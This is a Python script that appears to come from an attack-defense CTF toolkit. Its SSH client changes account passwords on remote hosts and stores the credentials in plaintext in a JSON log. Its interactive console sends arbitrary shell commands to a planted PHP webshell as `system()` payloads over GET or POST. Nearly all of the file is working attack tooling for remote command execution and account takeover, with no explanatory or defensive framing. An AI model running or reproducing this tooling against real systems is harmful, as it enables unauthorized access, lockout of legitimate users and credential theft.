#!/usr/bin/env python
#coding:utf-8

import paramiko
import requests
import json
import cmd
import os

class SSHClient():
    def __init__(self, host, port, username, auth, timeout=5):
        self.is_root = False
        self.host = host
        self.port = port
        self.username = username
        self.ssh_session = paramiko.SSHClient()
        self.ssh_session.load_system_host_keys()
        self.ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if auth[0]:
            self.password = auth[1]
            self.ssh_session.connect(hostname=self.host, port=self.port, username=self.username, password=self.password, timeout=timeout)
        else:
            self.key_file = auth[1]
            #private_key = paramiko.RSAKey._from_private_key_file(self.key_file)
            #self.ssh_session.connect(hostname=host, port=port, username=username, key=private_key, timeout=timeout)

    def infomation(self):
        inf = {'username':self.username,'passwd':self.password,'host':self.host,'port':self.port}
        return inf

    def exec_command(self, command):
        (stdin, stdout, stderr) = self.ssh_session.exec_command(command)
        return (stdin, stdout, stderr)

    def exec_command_print(self, command):
        stdin, stdout, stderr = self.exec_command(command)
        print ("-" * 0x10)
        print (stdout.read())
        print ("-" * 0x10)

    def interaction(self):
        while(True):
            SshCommand = str(input('('+self.host+')$'))
            if SshCommand == 'q' or SshCommand == 'quit':
                break
            else:
                self.exec_command_print(SshCommand)


    def check_root(self):
        stdin, stdout, stderr = self.exec_command("id")
        result = stdout.read()
        return ("uid=0" in result, result)

    def change_password(self, new_password):
        is_root = self.check_root()
        if is_root[0]:
            self.is_root = True
            print ("[+] Root user detected!")
            stdin, stdout, stderr = self.exec_command("passwd")
            stdin.write("%s\n" % (new_password))
            stdin.write("%s\n" % (new_password))
            stdout.read()
            error_message = stderr.read()[:-1]
            if "success" in error_message:
                self.password = new_password
                return True
            else:
                return False
        else:
            self.is_root = False
            print ("[+] Not a root user! (%s)" % (is_root[1]))
            stdin, stdout, stderr = self.exec_command("passwd")
            stdin.write("%s\n" % (self.password))
            stdin.write("%s\n" % (new_password))
            stdin.write("%s\n" % (new_password))
            stdout.read()
            error_message = stderr.read()[:-1]
            if "success" in error_message:
                self.password = new_password
                return True
            else:
                return False

    def save_log(self):
        filename = './runtime/log.json'
        inf = self.infomation()
        if os.path.isfile(filename):
            with open(filename) as json_file:  
                data = json.load(json_file)
                i = 0
                found = 0
                for p in data['ssh']:
                    if p['host'] == inf['host']:
                        data['ssh'][i]['username'] = inf['username']
                        data['ssh'][i]['passwd'] = inf['passwd']
                        data['ssh'][i]['port'] = inf['port']
                        found = 1
                        break
                    i = i + 1
                if found == 0:
                    data['ssh'].append(inf)
            with open(filename,'w') as outfile:  
                json.dump(data,outfile,indent=4)
        else:
            data = {}  
            data['shell'] = []
            data['ssh'] = []
            data['ssh'].append(inf)  
            with open(filename, 'w') as outfile:  
                json.dump(data, outfile ,indent=4)


class Output():
    def print_info(self,str):
        print ("[\033[1;33minfo\033[0m]"+str)
    def print_error(self,str):
        print ("[\033[1;31merror\033[0m]"+str)
    def print_result(self,str):
        print ("[\033[1;32mresult\033[0m]"+str)


class ShellCLI(cmd.Cmd):
    def __init__(self,url,method,passwd):
        self.url = url
        self.method = method
        self.passwd = passwd        
        cmd.Cmd.__init__(self)
        self.prompt = "\033[31m("+self.url+")$ \033[0m"
        self.intr = ""

    def infomation(self):
        inf = {'url':self.url,'method':self.method,'passwd':self.passwd}
        return inf
    
    def save_log(self):
        filename = './runtime/log.json'
        inf = self.infomation()
        if os.path.isfile(filename):
            with open(filename) as json_file:  
                data = json.load(json_file)
                i = 0
                found = 0
                for p in data['shell']:
                    if p['url'] == inf['url']:
                        data['shell'][i]['method'] = inf['method']
                        data['shell'][i]['passwd'] = inf['passwd']
                        found = 1
                        break
                    i = i + 1
                if found == 0:
                    data['shell'].append(inf)
            with open(filename,'w') as outfile:  
                json.dump(data,outfile,indent=4)
        else:
            data = {}  
            data['ssh'] = []
            data['shell'] = []  
            data['shell'].append(inf)
            with open(filename, 'w') as outfile:  
                json.dump(data, outfile ,indent=4)
    
    def shell_cmd_loop(self):
        s = requests.Session()
        while(True):
            ShellCommand = str(input(self.prompt))
            if ShellCommand == 'q' or ShellCommand == 'quit':
                break
            elif ShellCommand == 'write_log' or ShellCommand == 'w_l':
                self.save_log() #选择可用shell写入
            else:
                payload = 'system(\''+ShellCommand+'\');'
                if self.method == 'post':
                    print(s.post(self.url,data={self.passwd:payload}).text)
                elif self.method == 'get':
                    print(s.get(self.url+'?'+self.passwd+'='+payload).text)
                else:
                    print ('what method?')
